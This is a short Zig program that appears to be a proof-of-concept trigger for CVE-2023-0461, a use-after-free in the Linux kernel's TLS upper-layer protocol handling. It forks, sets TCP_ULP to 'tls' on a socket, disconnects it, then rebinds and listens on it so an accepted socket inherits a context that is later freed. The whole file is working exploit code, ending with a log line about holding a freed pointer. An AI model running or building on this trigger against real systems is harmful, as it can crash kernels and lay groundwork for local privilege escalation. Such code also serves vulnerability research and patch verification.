const std = @import("std");
const log = std.log;
const net = std.net;
const os = std.os;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;

const SOL = struct {
    pub const TCP = 6;
};

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n: u8 = 10;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, sock_addr, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 10000);

            continue;
        };

        return;
    }

    return last_err;
}

pub fn cve_2023_0461() !void {
    const server_addr = try net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const server_addr_p: *const l.sockaddr = @ptrCast(&server_addr.sa);
    const target_addr = try net.Ip4Address.parse("127.0.0.1", 0xdead);
    const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
    const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
    const addr_sz = @sizeOf(@TypeOf(server_addr.sa));

    const child_pid = try os.fork();

    if (child_pid == 0) {
        log.info("child: listen for first connection", .{});
        {
            const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
            defer os.closeSocket(server_sk);

            try os.bind(server_sk, server_addr_p, addr_sz);
            try os.listen(server_sk, 1);

            const client_sk = try os.accept(server_sk, null, null, 0);
            os.closeSocket(client_sk);
        }

        log.info("child: connect for second connection", .{});
        const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk);

        try retry_connect(client_sk, target_addr_p, addr_sz);

        return;
    }

    log.info("parent: connect for first connection", .{});
    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    try retry_connect(target_sk, server_addr_p, addr_sz);
    try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");
    try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
    try os.bind(target_sk, target_addr_p, addr_sz);

    log.info("parent: listen for second connection", .{});

    try os.listen(target_sk, 1);

    const client_sk = try os.accept(target_sk, null, null, 0);
    os.closeSocket(client_sk);

    _ = os.waitpid(child_pid, 0);

    log.info("Now have a reference to a freed ptr?", .{});
}

pub fn main() !void {
    try cve_2023_0461();
}
